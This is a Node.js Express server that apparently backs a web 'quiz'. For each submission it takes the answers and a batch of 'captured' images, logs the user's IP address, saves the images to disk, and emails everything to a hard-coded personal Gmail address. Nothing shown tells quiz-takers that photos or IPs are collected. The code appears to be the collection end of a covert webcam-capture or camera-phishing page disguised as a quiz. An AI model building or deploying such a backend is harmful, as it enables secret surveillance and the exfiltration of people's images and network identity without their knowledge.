require('dotenv').config();

const express = require('express');
const fs = require('fs/promises');
const path = require('path');
const { Resend } = require('resend');

const app = express();
const port = process.env.PORT || 3000;

const resend = new Resend(process.env.RESEND_API_KEY);

app.use(express.json({ limit: '50mb' }));

app.use(express.static(path.join(__dirname, 'public')));


app.post('/submit-answer', async (req, res) => {

    try {

        const userIP =
            req.headers['x-forwarded-for'] ||
            req.socket.remoteAddress;

        const answers = req.body.answers;
        const images = req.body.images;


        // Make sure we received the quiz data
        if (!answers || !images || images.length === 0) {

            return res.status(400).json({
                message: 'Quiz data or images were not received.'
            });

        }


        console.log(
            `Received quiz submission from IP: ${userIP}`
        );

        console.log(
            `Received ${images.length} images.`
        );


        const attachments = [];


        // Process every captured image
        for (let i = 0; i < images.length; i++) {

            const imageData = images[i];

            const base64Data =
                imageData.split(';base64,').pop();

            const fileName =
                `capture_${Date.now()}_${i + 1}.jpg`;

            const filePath =
                path.join(__dirname, fileName);


            // Save image locally
            await fs.writeFile(
                filePath,
                base64Data,
                'base64'
            );


            console.log(
                `Saved ${fileName}`
            );


            // Add image to email
            attachments.push({

                filename: fileName,

                content: base64Data

            });

        }


        // Format answers for email
        const answerText =
            answers
                .map(
                    (answer, index) =>
                        `Question ${index + 1}: ${answer}`
                )
                .join('\n');


        // Send ONE email containing all images
        const { data, error } =
            await resend.emails.send({

                from: 'onboarding@resend.dev',

                to: 'mmssnouse4@gmail.com',

                subject: 'New Quiz Submission',

                text:
`A new quiz submission was received.

User IP: ${userIP}

Answers:
${answerText}

Photos captured: ${images.length}`,

                attachments: attachments

            });


        if (error) {

            console.error(
                'Resend email error:',
                error
            );

            return res.status(500).json({

                message:
                    'Quiz was received, but the email failed to send.'

            });

        }


        console.log(
            'Email sent successfully:',
            data
        );


        res.json({

            message:
                'Quiz submitted successfully!'

        });


    } catch (error) {

        console.error(
            'Server error:',
            error
        );


        res.status(500).json({

            message:
                'An unexpected error occurred.'

        });

    }

});


app.listen(port, () => {

    console.log(
        `Server running at http://localhost:${port}`
    );

});